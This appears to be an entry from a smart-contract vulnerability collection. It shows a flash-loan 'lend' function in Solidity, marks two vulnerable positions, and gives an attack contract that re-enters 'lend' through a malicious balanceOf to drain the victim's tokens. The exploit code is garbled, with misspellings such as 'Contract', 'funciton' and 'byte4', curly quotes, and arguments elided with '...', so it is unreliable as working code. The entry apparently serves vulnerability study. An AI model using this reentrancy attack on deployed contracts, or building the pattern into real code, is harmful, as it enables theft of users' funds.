## Vulnerable Code

```javascript
**Instance_1**
function lend(address to, ERC20 token, uint256 amount, address target, bytes data) public payable {
        uint256 prevBalance = token.balanceOf(this);
        token.asmTransfer(to, amount);
        _inLendingMode += 1;
        require(caller().makeCall.value(msg.value)(target, data), "lend: arbitrary call failed");  //Vulnerable position_1
        _inLendingMode -= 1;
        require(token.balanceOf(this) >= prevBalance, "lend: lended token must be refilled"); //Vulnerable position_2
}


**Instance_2**
function lend(address to, ERC20 token, uint256 amount, address target, bytes data) public payable {
        uint256 expectedBalance = token.balanceOf(this).mul(TOTAL_PERCRENTS.add(_lendFee)).div(TOTAL_PERCRENTS);
        super.lend(to, token, amount, target, data);
        require(token.balanceOf(this) >= expectedBalance, "lend: tokens must be returned with lend fee");
}

```



## Exploit Code

```javascript
contract ERC20{

}
Contract Attack is ERC20{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    funciton balanceOf() payable{
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256(“lend(address , ERC20,  uint256, address, bytes)”)), ..., ERC20(this), ..., ..., ...);
        }
    }
    function() payable{

    }
}

```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position_2: IF token object obtained from a malicious address, the method of balanceOf can be a malicious function to reentrancy.Every single re-entry the comment of vulnerability position_1 will pick up the balance of Victim. ps:"...." represent an appropriate parameter
